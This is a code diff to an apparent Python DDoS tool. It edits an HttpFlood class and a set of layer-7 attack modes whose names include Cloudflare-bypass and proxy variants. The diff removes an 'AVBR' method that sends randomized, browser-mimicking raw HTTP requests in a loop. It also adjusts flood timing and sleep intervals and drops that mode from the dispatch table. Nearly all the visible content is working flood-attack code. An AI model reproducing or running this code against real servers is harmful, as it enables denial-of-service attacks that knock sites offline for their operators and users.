@@ -80,7 +80,7 @@ def exit(*message):
 class Methods:
     LAYER7_METHODS: Set[str] = {
         "CFB", "BYPASS", "GET", "POST", "OVH", "STRESS", "DYN", "SLOW", "HEAD",
-        "NULL", "COOKIE", "PPS", "EVEN", "GSB", "DGB", "AVB","AVBR", "CFBUAM","CFBUAMR",
+        "NULL", "COOKIE", "PPS", "EVEN", "GSB", "DGB", "AVB", "CFBUAM","CFBUAMR",
         "APACHE", "XMLRPC", "BOT", "BOMB", "DOWNLOADER", "KILLER", "TOR", "RHEX", "STOMP"
     }
 
@@ -730,7 +730,7 @@ class HttpFlood(Thread):
                                             "DYN", "SLOW", "PPS", "APACHE",
                                             "BOT", "RHEX", "STOMP"} \
             else "POST" if {method.upper()} & {"POST", "XMLRPC", "STRESS","CFBUAMR"} \
-            else "HEAD" if {method.upper()} & {"GSB", "HEAD","AVBR"} \
+            else "HEAD" if {method.upper()} & {"GSB", "HEAD"} \
             else "REQUESTS"
 
     def POST(self) -> None:
@@ -926,10 +926,10 @@ class HttpFlood(Thread):
             ts = time()
             for _ in range(self._rpc):
                 Tools.send(s, payload)
-                if time() > ts + 220: break
+                if time() > ts + 120: break
         Tools.safe_close(s)
-        
-      def AVB(self):
+
+    def AVB(self):
         payload: bytes = self.generate_payload()
         s = None
         with suppress(Exception), self.open_connection() as s:
@@ -937,28 +937,7 @@ class HttpFlood(Thread):
                 sleep(6)
                 Tools.send(s, payload)
         Tools.safe_close(s)
-    def AVBR(self):
-        payload = str.encode("%s %ss=%s HTTP/1.1\r\n" % (self._req_type,self._target.raw_path_qs,ProxyTools.Random.rand_str(6)) +
-                             "Host: %s\r\n" % self._target.authority +
-                             self.randHeadercontent +
-                             'Accept-Encoding: gzip, deflate, br\r\n'
-                             'Accept-Language: en-US,en;q=0.9\r\n'
-                             'Cache-Control: max-age=0\r\n'
-                             'Connection: Keep-Alive\r\n'
-                             'Sec-Fetch-Dest: document\r\n'
-                             'Sec-Fetch-Mode: navigate\r\n'
-                             'Sec-Fetch-Site: none\r\n'
-                             'Sec-Fetch-User: ?1\r\n'
-                             'Sec-Gpc: 1\r\n'
-                             'Pragma: no-cache\r\n'
-                             'Upgrade-Insecure-Requests: 1\r\n\r\n')
-        s = None
-        with suppress(Exception), self.open_connection() as s:
-            for _ in range(self._rpc):
-                Tools.send(s, payload)
-                sleep(6)
-        Tools.safe_close(s)
-        
+
     def DGB(self):
         global REQUESTS_SENT, BYTES_SEND
         with suppress(Exception):
@@ -1051,6 +1030,7 @@ class HttpFlood(Thread):
         with suppress(Exception), self.open_connection() as s:
             for _ in range(self._rpc):
                 Tools.send(s, payload)
+                sleep(3)
         Tools.safe_close(s)
 
     def RHEX(self):
@@ -1193,8 +1173,6 @@ class HttpFlood(Thread):
             self.SENT_FLOOD = self.OVH
         if name == "AVB":
             self.SENT_FLOOD = self.AVB
-        if name == "AVBR":
-            self.SENT_FLOOD = self.AVBR
         if name == "STRESS":
             self.SENT_FLOOD = self.STRESS
         if name == "DYN":
